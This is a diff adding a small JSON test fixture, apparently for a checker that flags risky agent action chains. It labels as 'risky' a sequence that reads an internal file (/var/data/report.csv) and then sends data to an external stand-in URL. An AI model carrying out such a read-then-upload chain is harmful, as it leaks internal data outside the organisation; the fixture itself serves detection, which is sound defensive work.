@@ -1,0 +1,8 @@
+{
+  "expected_label": "risky",
+  "category": "risky_chain",
+  "actions": [
+    { "type": "read_file", "summary": "Lecture d'un fichier interne", "payload": { "path": "/var/data/report.csv" } },
+    { "type": "write_external_url", "summary": "Envoi de donnees vers une URL externe", "payload": { "url": "https://external.example/ingest" } }
+  ]
+}
